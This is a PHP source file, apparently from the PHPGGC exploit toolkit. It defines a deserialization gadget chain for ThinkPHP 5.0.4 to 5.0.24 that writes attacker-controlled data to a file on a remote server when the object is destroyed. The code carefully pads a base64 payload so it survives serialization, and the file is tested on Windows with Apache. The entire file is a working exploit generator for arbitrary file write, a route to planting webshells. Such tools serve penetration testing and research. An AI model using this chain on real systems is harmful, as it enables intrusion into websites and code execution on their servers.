<?php

namespace GadgetChain\ThinkPHP;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '5.0.4-5.0.24';
    public static $vector = '__destruct';
    public static $author = 'zcy2018';
    public static $information = '
    We do not have full control of the path. Also, the path will turn to
    a long hex value(md5). Your file path will be REMOTE_PATH/3b58a9545013e88c7186db11bb158c44.php.
    Tested on Windows with php7.3.4 and apache2.4.39.
    ';

    public function generate(array $parameters)
    {
        # The payload string will get serialized before it gets written to the
        # base64-decode stream, so we need to be careful about the length.
        # e.g. s:100:"AAAA...."; will not decode the same as s:10:"AAA...";
        $path = $parameters['remote_path'];
        $data = base64_encode($parameters['data']);
        $data = preg_replace('/=/','+', $data);

        $length = strlen('<query>' . $data . '</query>');
        
        if($length > 100000)
            throw new \PHPGGC\Exception('Payload too big !');
        
        $log = (int) log10($length);
        $prefix = str_repeat('A', 4 - $log);
        $data = $prefix . $data;

        return new \think\Process($path, $data);
    }
}